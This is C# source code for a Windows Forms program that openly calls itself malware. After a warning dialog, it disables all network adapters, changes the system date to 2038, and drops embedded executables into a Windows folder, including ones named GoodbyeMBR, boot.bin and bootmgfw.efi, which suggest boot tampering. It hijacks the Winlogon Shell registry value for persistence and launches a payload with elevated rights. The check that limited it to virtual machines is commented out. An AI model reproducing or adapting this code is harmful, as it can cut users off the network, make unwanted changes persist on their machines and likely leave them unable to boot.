using System;
using System.Windows.Forms;
using Auth.GG_Winform_Example;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;
using auth.Properties;
using System.Reflection;
using System.Net;
using System.Linq;
using System.Management;
using System.Windows.Forms.VisualStyles;
using System.Drawing;

namespace auth
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.MinimizeBox = false;
            this.MaximizeBox = false;
            String thisprocessname = Process.GetCurrentProcess().ProcessName;

            if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
            {
                Environment.Exit(0);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private bool IsInstalledDotNetCompatible()
        {
            using (RegistryKey ndpKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full"))
            {
                int releaseKey = Convert.ToInt32(ndpKey.GetValue("Release"));
                if (releaseKey >= 461808)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }

        private bool redistCheck()
        {
            if (File.Exists("C:\\Windows\\System32\\vcruntime140.dll"))
            {
                return true;
            } else
            {
                return false;
            }
        }

        static string GetAdapterName(string line)
        {
            // Split the line into parts, removing any extra spaces
            string[] parts = line.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);

            // Check if there are enough parts to extract the adapter name
            if (parts.Length > 3)
            {
                // Get the last element using the length of the array
                return parts[parts.Length - 1];
            }

            return null;
        }

        static string ExecuteCommand(string command)
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/C {command}";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                // Read the output and error (if any) from the command
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                process.WaitForExit();

                // Throw an exception if there is an error
                if (!string.IsNullOrEmpty(error))
                    throw new Exception(error.Trim());

                return output.Trim(); // Return the output
            }
        }

        static void DisableAllAdapters()
        {
            Console.WriteLine("Disabling all network adapters...");

            // Get the list of adapters
            string adapters = ExecuteCommand("netsh interface show interface");
            string[] adapterLines = adapters.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);

            foreach (var line in adapterLines)
            {
                // Check if line represents an enabled adapter
                if (line.Contains("Enabled"))
                {
                    string adapterName = GetAdapterName(line);
                    if (!string.IsNullOrEmpty(adapterName))
                    {
                        Console.WriteLine($"Disabling adapter: {adapterName}");
                        ExecuteCommand($"netsh interface set interface \"{adapterName}\" admin=disable");
                    }
                }
            }
        }

        static void SetSystemDate(DateTime date)
        {
            Console.WriteLine($"Changing system date to {date:MM-dd-yyyy}...");
            ExecuteCommand($"date {date:MM-dd-yyyy}");
        }

        //private bool isVM()
        //{
        //    using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        //    {
        //        using (var items = searcher.Get())
        //        {
        //            foreach (var item in items)
        //            {
        //                string manufacturer = item["Manufacturer"].ToString().ToLower();
        //                if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
        //                    || manufacturer.Contains("vmware")
        //                    || item["Model"].ToString() == "VirtualBox")
        //                {
        //                    return true;
        //                }
        //            }
        //        }
        //    }
        //    return false;
        //}
        private void button1_Click(object sender, EventArgs e)
        {
            if (IsInstalledDotNetCompatible() == false)
            {
                MessageBox.Show("This app requires .NET Framework 4.7.2 or later to run properly. You can download .NET from Microsoft's website", ".NET Framework Compatibility Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            } else
            if (redistCheck() == false)
            {
                MessageBox.Show("C++ Redist not found on your system. Download the Microsoft C++ Redists from Microsoft's website", "Redist Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            } else
            // if(isVM() == false)
            //{
            //    MessageBox.Show("You're not using a Virtual Machine, so you may not proceed.", "Virtual Machine Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
            //    Environment.Exit(0);
            //} else
            {
                var s = MessageBox.Show("LAST WARNING: Do you want to execute this malware? This sample is malicious and is NOT A JOKE! The creator is NOT responsible for any damage done. You're responsible for your own actions. If in doubt, click \"No\" and nothing will happen.", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

                if (s == DialogResult.Yes)
                {
                    this.Hide();
                    DisableAllAdapters();
                    SetSystemDate(new DateTime(2038, 1, 19));
                    Directory.CreateDirectory(@"C:\Windows\SystemUpdateResources");
                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\UpdateScreen.exe", Resources.UpdateScreen);
                    if (!Directory.Exists(@"C:\Windows\SystemUpdateResources")) { Directory.CreateDirectory(@"C:\Windows\SystemUpdateResources"); } else { }
                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\phase3.exe", auth.Properties.Resources.phase3);
                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\PanOSMain.exe", auth.Properties.Resources.PanOSMain);
                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\BlacklistedApp.exe", auth.Properties.Resources.BlacklistedApp);
                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\GoodbyeMBR.exe", auth.Properties.Resources.GoodbyeMBR);
                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\boot.bin", auth.Properties.Resources.boot);
                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\bootmgfw.efi", auth.Properties.Resources.bootmgfw);
                    using (var iconStream = File.OpenWrite(@"C:\Windows\SystemUpdateResources\Belfiore.ico"))
                    {
                        Properties.Resources.Belfiore.Save(iconStream);
                    }
                    Stream wavStream = Properties.Resources.Windows_8_Error_Dubstep_Remix;
                    using (var fileStream = File.OpenWrite(@"C:\Windows\SystemUpdateResources\audio.wav"))
                    {
                        wavStream.CopyTo(fileStream);
                    }
                    File.WriteAllText(@"C:\Windows\SystemUpdateResources\PanOSMainLaunchHelper.vbs", auth.Properties.Resources.PanOSMainLaunchHelper);
                    File.Copy(@"C:\Windows\System32\cmd.exe", @"C:\Windows\SystemUpdateResources\backupcmd.exe", true);
                    File.Copy(@"C:\Windows\System32\taskkill.exe", @"C:\Windows\SystemUpdateResources\backuptaskkill.exe", true);
                    RegistryKey setshellkey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
                    setshellkey.SetValue("Shell", "explorer.exe, \"C:\\Windows\\SystemUpdateResources\\UpdateScreen.exe\"");
                    setshellkey.Dispose();
                    auth.Properties.Resources.BelfiOre_Windows_10_Wallpaper.Save(@"C:\Windows\SystemUpdateResources\BelfiOre Wallpaper.jpg");
                    Process startupdatescreen = new Process();
                    startupdatescreen.StartInfo.FileName = @"C:\Windows\SystemUpdateResources\UpdateScreen.exe";
                    startupdatescreen.StartInfo.Verb = "runas";
                    startupdatescreen.Start();
                    Environment.Exit(0);
                }
                else if (s == DialogResult.No)
                {
                    Environment.Exit(0);
                }
            }
        }
        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void Auth_Click(object sender, LinkLabelLinkClickedEventArgs e)
        {

        }

        private void AuthRequestKey_Click(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("mailto:orangemanagementcorpn@gmail.com");
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked == true)
            {
                button1.Enabled = true;
            } else
            {
                button1.Enabled = false;
            }
        }
    }
}
